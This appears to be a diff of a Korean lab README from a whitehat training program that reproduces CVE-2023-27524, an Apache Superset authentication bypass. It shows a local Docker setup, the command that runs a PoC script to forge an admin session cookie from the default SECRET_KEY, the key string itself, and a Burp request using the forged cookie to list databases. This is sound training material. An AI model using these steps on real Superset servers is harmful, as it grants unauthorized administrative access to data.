@@ -1,5 +1,5 @@
 # CVE-2023-27524 - Apache Superset 인증 우회 취약점
----
+
 > 화이트햇 스쿨 3기 (13반) - [박세민 (@8sheeta8)](https://github.com/8sheeta8) 
 
 ## 개요
@@ -19,24 +19,31 @@ Superset은 기본 설정으로 하드코딩된 SECRET_KEY 값을 사용합니�
 ## PoC GitHub
 
 ### 1. Docker를 이용한 취약 환경 구축
+
 ```
 docker compose up -d
 ```
+
 Superset 서버가 http://localhost:8088 에서 구동됩니다.
 
 
 ### 2. 의존성 설치
+
 ```
 # PoC 코드에 필요한 패키지를 설치합니다.
+
 pip install -r requirements.txt
 ```
 
 ### 3. Forged Session 쿠키 생성
+
 ```
 # PoC 코드를 실행하여 관리자 계정(user_id=1) 세션을 위조합니다.
+
 python CVE-2023-27524.py --url http://localhost:8088 --id 1 --validate
 ```
-실행 결과 요약:
+
+실행 결과
 기본 SECRET_KEY 사용 (CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET) 확인
 
 forged session 생성 완료
@@ -45,6 +52,7 @@ forged session 생성 완료
 <img width="1280" alt="제목 없음" src="https://github.com/user-attachments/assets/136e9b98-eb68-4ccc-a959-a0b914f95bf7" />
 
 ### 4. 인증 우회하여 백엔드 접근
+
 ```
 # BurpSuite를 통해 forged session으로 API 호출
 
@@ -52,6 +60,7 @@ GET /api/v1/database/ HTTP/1.1
 Host: localhost:8088
 Cookie: session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.aA4W5Q.ni44K6wlFydKq4jwQZ0k3JcC6T0
 ```
+
 정상적으로 200 OK 응답 수신
 데이터베이스 리스트 열람 가능
 
